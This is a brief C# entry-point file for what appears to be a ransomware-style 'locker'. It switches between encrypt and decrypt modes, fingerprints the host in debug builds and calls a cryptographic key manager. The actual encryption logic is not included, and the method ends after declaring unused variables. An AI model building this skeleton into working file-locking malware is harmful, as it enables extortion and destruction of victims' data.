using System.Diagnostics;
using System.Threading;



namespace s0s_L_ckr
{
    class Program
    {
        static void Main(string[] args)
        {
            Trace.Listeners.Add(new ConsoleTraceListener());

            string ops = (args.Length > 0 && args[0] == "--decrypt" ? "D" : "E");
            
            #if DEBUG
                        //Debug Generation
                        string fingerprint = null;
                        CompIdStrat.StickyFingerPrinter(ref fingerprint);

                        Trace.WriteLine("[+] System FingerPrint: " + fingerprint);
#endif

            // Criptographic Key Manager for Files
            CriptoKeyMgr.EnsrLocPubKey();

            int resultVal = -1;
            ThreadStart threadStart = null;
        }
    }
}
